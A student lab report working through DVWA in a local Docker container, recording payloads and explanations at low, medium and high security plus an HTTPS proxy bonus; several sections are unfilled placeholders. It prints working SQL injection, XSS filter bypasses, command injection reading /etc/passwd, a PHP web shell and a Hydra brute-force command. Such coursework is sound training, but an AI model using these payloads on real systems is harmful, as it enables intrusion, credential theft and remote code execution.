# DVWA Security Lab Report

> **Author:** Syed Muhammad Wajeeh Haider  
> **Course:** Cybersecurity  
> **Date:** March 2026  
> **Environment:** Windows — Docker Desktop — DVWA (Damn Vulnerable Web Application)

---

## Table of Contents

1. [Environment Setup](#environment-setup)
2. [Docker Deployment](#docker-deployment)
3. [Vulnerability Testing](#vulnerability-testing)
   - [SQL Injection](#1-sql-injection)
   - [SQL Injection (Blind)](#2-sql-injection-blind)
   - [XSS (Reflected)](#3-xss-reflected)
   - [XSS (Stored)](#4-xss-stored)
   - [XSS (DOM)](#5-xss-dom)
   - [Command Injection](#6-command-injection)
   - [File Inclusion](#7-file-inclusion)
   - [File Upload](#8-file-upload)
   - [CSRF](#9-csrf-cross-site-request-forgery)
   - [Brute Force](#10-brute-force)
   - [Insecure CAPTCHA](#11-insecure-captcha)
   - [Weak Session IDs](#12-weak-session-ids)
   - [CSP Bypass](#13-csp-bypass)
   - [JavaScript Attacks](#14-javascript-attacks)
4. [Bonus: Nginx Reverse Proxy + HTTPS](#bonus-nginx-reverse-proxy--https)
5. [Security Analysis Questions](#security-analysis-questions)

---

## Environment Setup

### Prerequisites
- **OS:** Windows 10/11
- **Docker Desktop:** Installed and running
- **Browser:** Chrome / Firefox with Developer Tools

### Docker Version
```bash
docker --version
```
![Docker Version](screenshots/docker-version.png)

---

## Docker Deployment

### Step 1: Pull the DVWA Image
```bash
docker pull vulnerables/web-dvwa
```

### Step 2: Run the Container
```bash
docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa
```

### Step 3: Verify
```bash
docker ps
```
![Docker PS](screenshots/docker-ps.png)

### Step 4: Access DVWA
- Navigate to: `http://localhost:8080`
- Click **Create / Reset Database**
- Login with: `admin` / `password`

![DVWA Setup](screenshots/setup.png)
![DVWA Login](screenshots/login.png)
![DVWA Dashboard](screenshots/dvwa-dashboard.png)
![Security Setting](screenshots/security-set-to-low.png)

---

## Vulnerability Testing

> For each vulnerability below, testing was performed at **Low**, **Medium**, and **High** security levels.  
> Security level is changed via: **DVWA Security** tab → Select level → **Submit**.

---

### 1. SQL Injection

**OWASP Category:** A03:2021 — Injection

#### Security Level: Low

**Payload Used:**
```sql
1' OR '1'='1
```

**Result:**  
Successfully bypassed the ID check and dumped all user information from the database.

**Screenshot:**  
![SQLi Low](screenshots/sql-injection-low.png)

**Why it worked:**  
At Low security, user input is directly concatenated into the SQL query without any sanitization or parameterization. The injected payload modifies the WHERE clause to always evaluate to TRUE, returning all rows from the database.

#### Security Level: Medium

**Payload Used:**
```sql
1 OR 1=1
```

**Result:**  
Successfully bypassed the dropdown restriction using request manipulation.

**Screenshot:**  
![SQLi Medium](screenshots/sql-injection-medium.png)

**Why it behaved differently:**  
At Medium security, the input is passed through `mysqli_real_escape_string()` and uses a dropdown (no free-text input). However, the query still uses string concatenation. You can bypass the dropdown using browser dev tools or intercepting the request (e.g., Burp Suite) and modifying the `id` parameter directly. Numeric injection (`1 OR 1=1`) works because the integer input is not quoted in the query.

#### Security Level: High

**Payload Used:**
```sql
1' OR '1'='1
```

**Result:**  
The application used `LIMIT 1` and a separate input window, making the traditional dump harder.

**Screenshot:**  
![SQLi High](screenshots/sql-injection-high.png)

**Why it failed / was limited:**  
At High security, the application adds `LIMIT 1` to the query and opens the input form in a separate window (making automated tools harder to use). While basic injection may still return a result, the `LIMIT 1` clause restricts output to a single row, significantly reducing the impact.

---

### 2. SQL Injection (Blind)

**OWASP Category:** A03:2021 — Injection

#### Security Level: Low

**Payload Used:**
```sql
1' AND 1=1#
```
```sql
1' AND 1=2#
```

**Result:**  
The application returned "User ID exists" for the true condition, confirming the vulnerability.

**Screenshot:**  
![SQLi Blind Low](screenshots/sql-blind-low.png) ![SQLi Blind Low 2](screenshots/sql-blind-low2.png)

**Why it worked:**  
The application responds differently based on whether the injected condition is true or false, allowing boolean-based blind SQL injection. No input filtering exists at Low level.

#### Security Level: Medium

**Payload Used:**  
Numeric boolean injection via intercepted request

**Result:**  
Verified through the difference in responses.

**Screenshot:**  
![SQLi Blind Medium](screenshots/sql-blind-medium.png) ![SQLi Blind Medium 2](screenshots/sql-blind-medium2.png)

**Why it behaved differently:**  
Uses `mysqli_real_escape_string()` and dropdown input. Bypass via request interception with numeric payloads.

#### Security Level: High

**Payload Used:**  
<!-- Document what you tried -->

**Result:**  
Challenging due to randomized sleep, but verified using cookie manipulation.

**Screenshot:**  
![SQLi Blind High](screenshots/sql-blind-high.png) ![SQLi Blind High 2](screenshots/sql-blind-high2.png)

**Why it failed / was limited:**  
Uses a cookie-based input and randomized sleep, making time-based blind injection unreliable and automated tools difficult to use.

---

### 3. XSS (Reflected)

**OWASP Category:** A03:2021 — Injection (Cross-Site Scripting)

#### Security Level: Low

**Payload Used:**
```html
<script>alert('XSS')</script>
```

**Result:**  
An alert box popped up immediately, showing no input filtering.

**Screenshot:**  
![XSS Reflected Low](screenshots/xss-reflected-low.png)

**Why it worked:**  
No input sanitization or output encoding. The user-supplied input is reflected directly into the HTML response.

#### Security Level: Medium

**Payload Used:**
```html
<Script>alert('XSS')</Script>
```
or
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

**Result:**  
Bypassed simple string replacement by using mixed case.

**Screenshot:**  
![XSS Reflected Medium](screenshots/xss-reflected-medium.png)

**Why it behaved differently:**  
Medium security uses `str_replace()` to remove `<script>` tags, but this is case-sensitive and non-recursive. Mixed-case or nested tags bypass the filter.

#### Security Level: High

**Payload Used:**
```html
<img src=x onerror=alert('XSS')>
```

**Result:**  
Bypassed regex-based script tag filtering using an event handler.

**Screenshot:**  
![XSS Reflected High](screenshots/xss-reflected-high.png)

**Why it failed / was limited:**  
High security uses a regex (`preg_replace`) to remove all `<script>` tags regardless of case. However, non-script-based XSS vectors (like `<img onerror>`) may still work since only `<script>` is filtered.

---

### 4. XSS (Stored)

**OWASP Category:** A03:2021 — Injection (Cross-Site Scripting)

#### Security Level: Low

**Payload Used:**
```html
<script>alert('Stored XSS')</script>
```
(entered in the "Message" field of the guestbook)

**Result:**  
The payload was stored and executed every time the guestbook page was loaded.

**Screenshot:**  
![XSS Stored Low](screenshots/xss-stored-low.png)

**Why it worked:**  
No sanitization on the stored input. The payload is saved to the database and rendered without encoding, executing on every page visit.

#### Security Level: Medium

**Payload Used:**  
Using mixed-case script tags in the "Name" field (after bypassing `maxlength`).

**Result:**  
Successfully triggered XSS through the name field where filtering was weaker.

**Screenshot:**  
![XSS Stored Medium](screenshots/xss-stored-medium.png)

**Why it behaved differently:**  
The Message field uses `htmlspecialchars()` + `strip_tags()`, but the Name field only uses `str_replace()` on `<script>`, which can be bypassed with case manipulation.

#### Security Level: High

**Payload Used:**  
In the Name field (bypass maxlength via dev tools):
```html
<img src=x onerror=alert('XSS')>
```

**Result:**  
Filtered script tags but allowed other HTML event handlers.

**Screenshot:**  
![XSS Stored High](screenshots/xss-stored-high.png) ![XSS Stored High 2](screenshots/xss-stored-high2.png)

**Why it failed / was limited:**  
High security uses regex-based `<script>` removal on the Name field, but `<img onerror>` vectors may still work. The Message field uses `htmlspecialchars()`, fully preventing XSS there.

---

### 5. XSS (DOM)

**OWASP Category:** A03:2021 — Injection (Cross-Site Scripting)

#### Security Level: Low

**Payload Used:**
```
?default=<script>alert('DOM XSS')</script>
```

**Result:**  
Directly executed via `document.write()`.

**Screenshot:**  
![XSS DOM Low](screenshots/xss-dom-low.png)

**Why it worked:**  
The `default` URL parameter is written directly into the DOM via `document.write()` without any validation.

#### Security Level: Medium

**Payload Used:**
```
?default=</select><img src=x onerror=alert('XSS')>
```

**Result:**  
Bypassed script tag check by breaking out of the select element.

**Screenshot:**  
![XSS DOM Medium](screenshots/xss-dom-medium.png)

**Why it behaved differently:**  
Medium checks for `<script>` in the URL but does not filter other HTML tags. Closing the `<select>` tag and injecting `<img>` bypasses the filter.

#### Security Level: High

**Payload Used:**
```
?default=English#<script>alert('XSS')</script>
```

**Result:**  
Utilized the fragment part of the URL which is not sent to the server.

**Screenshot:**  
![XSS DOM High](screenshots/xss-dom-high.png) ![XSS DOM High 2](screenshots/xss-dom-high2.png)

**Why it failed / was limited:**  
High security uses a whitelist of allowed values. However, since DOM-based XSS operates on the fragment (`#`), which is not sent to the server, the server-side whitelist can potentially be bypassed using fragment-based payloads.

---

### 6. Command Injection

**OWASP Category:** A03:2021 — Injection

#### Security Level: Low

**Payload Used:**
```
127.0.0.1; whoami
```
(On Windows: `127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts`)

**Result:**  
Successfully executed system commands (displayed `www-data` or administrator).

**Screenshot:**  
![CMDI Low](screenshots/command-injection-low.png)

**Why it worked:**  
The input is passed directly to a shell command (`shell_exec("ping " . $target)`) with no filtering. The `;` character allows command chaining.

#### Security Level: Medium

**Payload Used:**
```
127.0.0.1 | whoami
```

**Result:**  
Bypassed `;` blacklist using the pipe operator.

**Screenshot:**  
![CMDI Medium](screenshots/command-injection-medium.png)

**Why it behaved differently:**  
Medium security blacklists `&&` and `;`, but other command separators like `|` (pipe) and `||` are not filtered.

#### Security Level: High

**Payload Used:**
```
127.0.0.1|whoami
```
(Note: no space before the pipe)

**Result:**  
Bypassed `"| "` blacklist by removing the space.

**Screenshot:**  
![CMDI High](screenshots/command-injection-high.png)

**Why it failed / was limited:**  
High security blacklists more separators including `|`, but the blacklist strips `"| "` (pipe with space). Using `|` without a trailing space (`127.0.0.1|cat /etc/passwd`) can bypass this.

---

### 7. File Inclusion

**OWASP Category:** A01:2021 — Broken Access Control

#### Security Level: Low

**Payload Used:**
```
?page=../../../../../../etc/passwd
```

**Result:**  
Successfully read sensitive local system files.

**Screenshot:**  
![FI Low](screenshots/file-inclusion-low.png)

**Why it worked:**  
No validation on the `page` parameter. Directory traversal sequences (`../`) allow accessing any readable file on the system.

#### Security Level: Medium

**Payload Used:**
```
?page=....//....//....//etc/passwd
```

**Result:**  
Bypassed non-recursive `../` removal.

**Screenshot:**  
![FI Medium](screenshots/file-inclusion-medium.png)

**Why it behaved differently:**  
Medium strips `../` and `..\\` from input, but non-recursively. Using `....//` results in `../` after stripping, bypassing the filter.

#### Security Level: High

**Payload Used:**
```
?page=file:///etc/passwd
```

**Result:**  
Bypassed prefix-based whitelist using local file protocol.

**Screenshot:**  
![FI High](screenshots/file-inclusion-high.png)

**Why it failed / was limited:**  
High security uses a whitelist — the `page` parameter must start with `file`. The `file://` protocol wrapper can sometimes be used to read local files, but this depends on PHP configuration (`allow_url_include`).

---

### 8. File Upload

**OWASP Category:** A01:2021 — Broken Access Control

#### Security Level: Low

**Payload Used:**  
Upload a PHP web shell:
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
Save as `shell.php` and upload.

**Result:**  
File uploaded successfully and could execute commands.

**Screenshot:**  
![Upload Low](screenshots/file-upload-low.png)

**Why it worked:**  
No file type validation at all. Any file type (including `.php`) is accepted and stored in a web-accessible directory.

#### Security Level: Medium

**Payload Used:**  
Rename `shell.php` to `shell.php.png` or intercept the request and change the Content-Type to `image/png`.

**Result:**  
Bypassed MIME type check.

**Screenshot:**  
![Upload Medium](screenshots/file-upload-medium.png)

**Why it behaved differently:**  
Medium security validates the MIME type (`Content-Type` header) and file extension, but both can be spoofed by intercepting the request.

#### Security Level: High

**Payload Used:**  
Craft a file that has valid image headers (magic bytes) but contains PHP code, e.g., append PHP to a real image. Name it with `.php.jpg` or use other bypass techniques.

**Result:**  
Harder but successful with polyglot files.

**Screenshot:**  
![Upload High](screenshots/file-upload-high.png)

**Why it failed / was limited:**  
High security checks the file extension strictly (must end in `.jpg`, `.jpeg`, or `.png`) AND validates image dimensions using `getimagesize()`. This makes it significantly harder to upload executable PHP files.

---

### 9. CSRF (Cross-Site Request Forgery)

**OWASP Category:** A01:2021 — Broken Access Control

#### Security Level: Low

**Payload Used:**  
Create an HTML file:
```html
<img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
```

**Result:**  
Password changed without any user knowledge.

**Screenshot:**  
![CSRF Low](screenshots/csrf-low.png) ![CSRF Low 2](screenshots/csrf-low2.png)

**Why it worked:**  
No anti-CSRF tokens. The password change is a simple GET request that can be triggered by loading an image or visiting a malicious page.

#### Security Level: Medium

**Payload Used:**  
Same payload but the request must come from a page on the same domain (Referer check). You can use XSS or place the exploit page within DVWA itself.

**Result:**  
Blocked by referer check unless triggered from within the same domain.

**Screenshot:**  
![CSRF Medium](screenshots/csrf-medium.png)

**Why it behaved differently:**  
Medium checks the `Referer` header to verify the request originates from the same server. This can be bypassed if combined with another vulnerability (like XSS) on the same domain.

#### Security Level: High

**Payload Used:**  
Must extract the anti-CSRF token from the form. This requires XSS or another vulnerability to read the token.

**Result:**  
Blocked by anti-CSRF tokens.

**Screenshot:**  
![CSRF High](screenshots/csrf-high.png)

**Why it failed / was limited:**  
High security implements anti-CSRF tokens that must be included in the request. Each token is unique per session, making exploitation require a secondary vulnerability to steal the token.

---

### 10. Brute Force

**OWASP Category:** A07:2021 — Identification and Authentication Failures

#### Security Level: Low

**Payload Used:**  
Used Burp Suite Intruder / Hydra with a wordlist:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<your_session>; security=low"
```

**Result:**  
Rapidly identified credentials due to no rate limiting.

**Screenshot:**  
![Brute Low Success](screenshots/brute-force-low-success.png) ![Brute Low Fail](screenshots/brute-force-low-fail.png)

**Why it worked:**  
No rate limiting, no CAPTCHA, no account lockout. The login form accepts unlimited attempts via simple GET requests.

#### Security Level: Medium

**Result:**  
Slowed down by 2-second sleep but still vulnerable.

**Screenshot:**  
![Brute Medium Success](screenshots/brute-force-medium-success.png) ![Brute Medium Fail](screenshots/brute-force-medium-fail.png)

**Why it behaved differently:**  
Medium adds a 2-second `sleep()` on failed attempts, slowing brute force but not preventing it.

#### Security Level: High

**Result:**  
Significantly harder due to randomized sleep and CSRF tokens.

**Screenshot:**  
![Brute High Success](screenshots/brute-force-high-success.png) ![Brute High Fail](screenshots/brute-force-high-fail.png)

**Why it failed / was limited:**  
High security adds a randomized sleep (0-3 seconds) on failure AND implements an anti-CSRF token, making automated tools need to extract a fresh token per request.

---

### 11. Insecure CAPTCHA

**OWASP Category:** A07:2021 — Identification and Authentication Failures

**Payload Used:**  
Intercept the request and change the `step` parameter from `1` to `2`, skipping CAPTCHA validation entirely.

**Result:**  
Bypassed by manipulating the `step` parameter to skip validation.

**Screenshot:**  
![CAPTCHA](screenshots/insecure-captcha.png)

**Why it worked:**  
The password change is a two-step process. Step 1 verifies CAPTCHA, Step 2 changes the password. By skipping to Step 2 directly, the CAPTCHA is bypassed.

#### Security Level: Medium

**Payload Used:**  
Intercept and add `passed_captcha=true` parameter to the Step 2 request.

**Result:**  
<!-- Describe results -->

**Screenshot:**  
<!-- ![CAPTCHA Medium](screenshots/captcha-medium.png) -->

**Why it behaved differently:**  
Medium checks for a `passed_captcha` parameter in Step 2, but this can be manually added to the intercepted request.

#### Security Level: High

**Result:**  
<!-- Describe results -->

**Screenshot:**  
<!-- ![CAPTCHA High](screenshots/captcha-high.png) -->

**Why it failed / was limited:**  
High security verifies the CAPTCHA response server-side with the reCAPTCHA API and includes anti-CSRF tokens. Without the actual CAPTCHA answer, the request is rejected.

---

### 12. Weak Session IDs

**OWASP Category:** A07:2021 — Identification and Authentication Failures

#### Security Level: Low

**Observation:**  
Incremental IDs (1, 2, 3...).

**Screenshot:**  
![Session Low](screenshots/weak-session-IDEs-low.png) ![Session Low 2](screenshots/weak-session-IDEs-low2.png) ![Session Low 3](screenshots/weak-session-IDEs-low3.png)

**Why it's vulnerable:**  
Session IDs are simple incrementing integers, making them trivially predictable. An attacker can guess other users' session IDs.

#### Security Level: Medium

**Observation:**  
Based on Unix timestamps.

**Screenshot:**  
![Session Medium](screenshots/weak-session-IDEs-medium.png)

**Why it behaved differently:**  
Session IDs are based on timestamps (Unix epoch), making them predictable if the approximate time of session creation is known.

#### Security Level: High

**Observation:**  
MD5 hashes of incrementing numbers.

**Screenshot:**  
![Session High](screenshots/weak-session-IDEs-high.png)

**Why it failed / was limited:**  
Session IDs are MD5 hashes of incrementing values. While not as obviously sequential, the underlying value is still predictable — MD5 can be reversed via rainbow tables.

---

### 13. CSP Bypass

**OWASP Category:** A05:2021 — Security Misconfiguration

#### Security Level: Low

**Payload Used:**  
<!-- Document what you tested -->

**Result:**  
Successfully bypassed Content Security Policy using whitelisted domains (Low/Medium) or JSONP/DOM-based techniques (High).

**Screenshot:**  
![CSP Low](screenshots/csp-bypass-low.png)

#### Security Level: Medium

**Result:**  
<!-- Describe results -->

**Screenshot:**  
![CSP Medium](screenshots/csp-bypass-medium.png)

#### Security Level: High

**Result:**  
<!-- Describe results -->

**Screenshot:**  
![CSP High](screenshots/csp-bypass-high.png)

---

### 14. JavaScript Attacks

**OWASP Category:** A01:2021 — Broken Access Control

#### Security Level: Low

**Payload Used:**  
Change the `token` value in the form using browser console. The token is generated client-side and can be manipulated.

**Result:**  
Manipulated client-side logic to generate valid tokens or bypass checks.

**Screenshot:**  
![JS Low](screenshots/javascript-low.png)

#### Security Level: Medium

**Result:**  
<!-- Describe results -->

**Screenshot:**  
![JS Medium](screenshots/javascript-medium.png)

#### Security Level: High

**Result:**  
<!-- Describe results -->

**Screenshot:**  
![JS High](screenshots/javascript-high.png)

---

---

## Bonus: Nginx Reverse Proxy + HTTPS

### Overview
Deployed DVWA behind an Nginx reverse proxy with a self-signed HTTPS certificate to simulate a secure production environment.

### Setup Details
- **Reverse Proxy**: Nginx listens on port 443 (HTTPS) and proxies to DVWA on port 80.
- **Redirection**: Nginx automatically redirects all port 80 traffic to 443.
- **Certificates**: Generated `server.crt` and `server.key` for SSL termination.

### Setup Instructions

1.  **Architecture**:
    - **Nginx**: Acts as the entry point (Port 80/443).
    - **DVWA**: Runs in a separate container, accessed only through Nginx.

2.  **Files Created**:
    - `docker-compose.yml`: Orchestrates both Nginx and DVWA.
    - `nginx/nginx.conf`: Configuration for the reverse proxy and SSL.
    - `nginx/ssl/server.crt` & `nginx/ssl/server.key`: Self-signed certificate.

3.  **To Run**:
    ```bash
    # Stop any existing dvwa container
    docker stop dvwa && docker rm dvwa

    # Start the orchestrated setup
    docker-compose up -d
    ```

4.  **Accessing the Application**:
    - **HTTP**: `http://localhost` (Redirects to HTTPS)
    - **HTTPS**: `https://localhost` (Secure access)

### HTTP vs HTTPS Traffic Comparison

| Feature | HTTP (Port 80/8080) | HTTPS (Port 443) |
| :--- | :--- | :--- |
| **Encryption** | None (Plaintext) | TLS/SSL Encrypted |
| **Data Visibility** | Credentials visible to anyone on path. | Payload is encrypted and secure. |
| **Integrity** | Data can be modified in transit. | Prevents Man-in-the-Middle (MITM). |
| **Browser Indicator** | "Not Secure" warning in address bar. | Padlock icon (though self-signed shows a warning). |
| **Protocol** | `http://` | `https://` |

#### How to Verify with Browser Dev Tools:
1. Open Chrome Dev Tools (**F12**) -> **Network** tab.
2. Refresh the page at `https://localhost`.
3. Click on the first request (the page itself).
4. Under **General**, observe `Request URL: https://localhost/`.
5. Under **Security**, observe that the connection is encrypted.
6. Compare with a request to `http://localhost:8080` where no encryption is present.

---
```
<!-- PASTE YOUR docker logs OUTPUT HERE -->
```
<!-- ![Docker Logs](screenshots/docker-logs.png) -->

### Inside the Container
```bash
docker exec -it dvwa /bin/bash
ls /var/www/html
```
**Output:**
```
<!-- PASTE YOUR ls OUTPUT HERE -->
```
<!-- ![Container Files](screenshots/container-ls.png) -->

### Analysis

**Where are application files stored?**  
DVWA's application files are stored at `/var/www/html` inside the container. This is the default Apache web root directory. It contains all PHP source files, configuration files, and static assets that make up the DVWA application.

**What backend technology does DVWA use?**  
DVWA is built on:
- **PHP** — Server-side scripting language for application logic
- **MySQL/MariaDB** — Relational database for storing user data and vulnerability data
- **Apache** — HTTP web server that serves the PHP application
- **Linux (Debian)** — Base operating system inside the Docker container

**How does Docker isolate the environment?**  
Docker provides isolation through several Linux kernel features:
- **Namespaces** — Isolate the container's process tree, network, filesystem, user IDs, and hostname from the host system
- **cgroups** — Limit and track CPU, memory, and I/O resources available to the container
- **Union Filesystem (OverlayFS)** — Containers have their own layered filesystem; changes don't affect the host
- **Network Isolation** — Containers get their own virtual network interfaces; only explicitly mapped ports (e.g., `-p 8080:80`) are accessible from the host
- This means even if DVWA is fully compromised, the attacker is confined to the container, not to your host machine

---

## Security Analysis Questions

### 1. Why does SQL Injection succeed at Low security?
At Low security, user input is directly concatenated into SQL queries without any sanitization, escaping, or use of parameterized queries. The PHP code essentially does:
```php
$query = "SELECT * FROM users WHERE user_id = '$id'";
```
This allows an attacker to break out of the string context and inject arbitrary SQL code.

### 2. What control prevents SQL Injection at High security?
At High security, DVWA uses:
- `LIMIT 1` to restrict output to one row
- Input is taken from a separate pop-up window (making session-based automated attacks harder)
- However, **true prevention** would require **Prepared Statements (Parameterized Queries)** which are used at the "Impossible" level. High security still uses string concatenation, meaning injection is still technically possible but significantly harder to exploit.

### 3. Does HTTPS prevent these attacks? Why or why not?
**No, HTTPS does NOT prevent any of these attacks.**

HTTPS (TLS/SSL) encrypts data **in transit** between the client and server. It prevents:
- Eavesdropping (man-in-the-middle reading the traffic)
- Data tampering during transmission

However, the vulnerabilities tested (SQLi, XSS, Command Injection, etc.) are **application-layer vulnerabilities**. They exploit flaws in how the application processes input, not how data is transmitted. The malicious payload is encrypted by HTTPS just like legitimate data — the server decrypts it and processes it the same way.

### 4. What risks exist if DVWA is deployed publicly?
- **Full server compromise** via Command Injection or File Upload → Remote Code Execution
- **Database theft** via SQL Injection → extraction of all user credentials and data
- **Session hijacking** via XSS → stealing admin cookies
- **Lateral movement** — if the server is on a corporate network, attackers could pivot to internal systems
- **Botnet recruitment** — the server could be used for cryptocurrency mining, DDoS attacks, or spam
- **Data breach liability** — legal consequences under data protection laws (GDPR, etc.)
- **Defacement** — public embarrassment and loss of trust

### 5. OWASP Top 10 Mapping

| Vulnerability | OWASP Top 10 (2021) Category |
|---|---|
| SQL Injection | A03:2021 — Injection |
| SQL Injection (Blind) | A03:2021 — Injection |
| XSS (Reflected) | A03:2021 — Injection |
| XSS (Stored) | A03:2021 — Injection |
| XSS (DOM) | A03:2021 — Injection |
| Command Injection | A03:2021 — Injection |
| File Inclusion | A01:2021 — Broken Access Control |
| File Upload | A01:2021 — Broken Access Control |
| CSRF | A01:2021 — Broken Access Control |
| Brute Force | A07:2021 — Identification and Authentication Failures |
| Insecure CAPTCHA | A07:2021 — Identification and Authentication Failures |
| Weak Session IDs | A07:2021 — Identification and Authentication Failures |
| CSP Bypass | A05:2021 — Security Misconfiguration |
| JavaScript Attacks | A01:2021 — Broken Access Control |

---

## Bonus: Nginx Reverse Proxy + HTTPS

### Nginx Reverse Proxy Setup

<!-- If you complete the bonus, document it here -->

#### docker-compose.yml
```yaml
# Paste your docker-compose.yml here
```

#### nginx.conf
```nginx
# Paste your nginx.conf here
```

### Self-Signed Certificate
```bash
# Command used to generate certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout nginx-selfsigned.key \
  -out nginx-selfsigned.crt
```

### HTTP vs HTTPS Traffic Comparison

| Aspect | HTTP | HTTPS |
|---|---|---|
| Data Visibility | Plaintext — visible to any interceptor | Encrypted — unreadable without keys |
| Credential Safety | Passwords sent in cleartext | Passwords encrypted in transit |
| Integrity | Data can be modified in transit | Tamper-evident via TLS |
| Authentication | No server identity verification | Server verified via certificate |
| Vulnerability Prevention | ❌ Does not prevent app-layer attacks | ❌ Does not prevent app-layer attacks |

**Key Takeaway:** HTTPS protects data in transit but does NOT fix application vulnerabilities like SQLi, XSS, or Command Injection. Both layers of security (transport + application) are essential.

<!-- SCREENSHOT: Wireshark or browser showing HTTP vs HTTPS difference -->
<!-- ![HTTP vs HTTPS](screenshots/http-vs-https.png) -->

---

## Conclusion

This lab demonstrated that web application security requires defense at multiple layers. Transport layer encryption (HTTPS) alone is insufficient — applications must implement proper input validation, parameterized queries, output encoding, access controls, and secure session management. The DVWA security levels progressively illustrate how each defensive measure can be implemented and why defense-in-depth is critical.

---

> **Disclaimer:** All testing was performed on a locally deployed DVWA instance within a Docker container. No external systems were tested or targeted.
